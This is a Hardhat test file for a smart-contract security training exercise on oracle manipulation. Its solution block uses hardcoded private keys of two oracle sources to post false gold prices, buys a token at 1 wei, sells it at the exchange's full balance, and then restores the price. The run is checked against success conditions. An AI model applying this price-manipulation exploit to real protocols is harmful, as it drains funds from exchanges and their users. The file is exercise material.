const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Oracle Manipulation Exercise 1', function () {

    const sources = [
        '0x4aC89064Fa0d03De57f802feC722925b4502572A',
        '0x96574c0392112CbEe134eb77e76A183d54A7c18f',
        '0xA7804BB057EBB7D0c0a3C7F4B8710AE854525fd4'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_BALANCE = ethers.utils.parseEther('1800');
    const INITIAL_GOLD_PRICE = ethers.utils.parseEther('1.5');
    const ATTACKER_ETHER_TO_SEND = ethers.utils.parseEther('0.001');

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, attacker] = await ethers.getSigners();

        // Attacker starts with 1 ETH
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0xDE0B6B3A7640000", // 1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('1'));
        this.initialAttackerBalance = await ethers.provider.getBalance(attacker.address);

        // Sources starts with 10 ETH
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x8AC7230489E80000", // 10 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('10'));
        }

        // Factories
        const ExchangeFactory = await ethers.getContractFactory(
            'contracts/oracle-manipulation-1/GoldExchange.sol:GoldExchange',
            deployer
        );
        const TokenFactory = await ethers.getContractFactory(
            'contracts/oracle-manipulation-1/GoldToken.sol:GoldToken',
            deployer
        );
        const OracleFactory = await ethers.getContractFactory(
            'contracts/oracle-manipulation-1/GoldOracle.sol:GoldOracle',
            deployer
        );

        // Deploy contracts
        this.token = await TokenFactory.deploy();
        this.oracle = await OracleFactory.deploy(sources, [INITIAL_GOLD_PRICE, INITIAL_GOLD_PRICE, INITIAL_GOLD_PRICE]);
        this.exchange = await ExchangeFactory.deploy(
            this.token.address,
            this.oracle.address,
            { value: EXCHANGE_INITIAL_BALANCE }
        );

        // Transfer token ownership to exchange
        await this.token.transferOwnership(this.exchange.address);
    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */
        const privateKey2 = "0x221b93d924f48fcf998c7f20b4be36d12eb1d637a8f49e6e76c154f105e882af";
        const privateKey3 = "0x390e61fd668d2cf6db3305df8dc5366ed53d58610cee715c57dfd9f780579344";

        const wallet2 = new ethers.Wallet(privateKey2);
        const wallet3 = new ethers.Wallet(privateKey3);

        const signer2 = wallet2.connect(ethers.provider);
        const signer3 = wallet3.connect(ethers.provider);

        await this.oracle.connect(signer2).postPrice(1);
        await this.oracle.connect(signer3).postPrice(1);

        console.log("Gold price is now: ", await this.oracle.getPrice());

        let goldTokenNumber = await this.token.connect(attacker).balanceOf(this.exchange.address);

        // console.log("Gold token in the Exhange is: ", goldTokenNumber);
        await this.exchange.connect(attacker).buyTokens(1, { value: 1 });

        console.log(
            "Gold token in the Attacker now  is: ",
            await this.token.connect(attacker).balanceOf(attacker.address)
        );
        await this.oracle.connect(signer2).postPrice(EXCHANGE_INITIAL_BALANCE);
        await this.oracle.connect(signer3).postPrice(EXCHANGE_INITIAL_BALANCE);
        // "0.999852786664288407"
        // "1800, 999710307402565006"
        console.log("balance of attacker is ", await ethers.provider.getBalance(attacker.address));
        await this.token.connect(attacker).approve(this.exchange.address, 1);
        await this.exchange.connect(attacker).sellTokens(1);

        console.log("balance of attacker is ", await ethers.provider.getBalance(attacker.address));


        await this.oracle.connect(signer2).postPrice(INITIAL_GOLD_PRICE);
        await this.oracle.connect(signer3).postPrice(INITIAL_GOLD_PRICE);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Exchange lost almost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.lt(ethers.utils.parseEther('0.1'));

        // Attacker's earned a lot of ETH on top of the exchange
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.initialAttackerBalance.add(EXCHANGE_INITIAL_BALANCE).sub(ethers.utils.parseEther('0.2')));

        // Gold price shouldn't have changed
        expect(
            await this.oracle.getPrice()
        ).to.eq(INITIAL_GOLD_PRICE);
    });
});
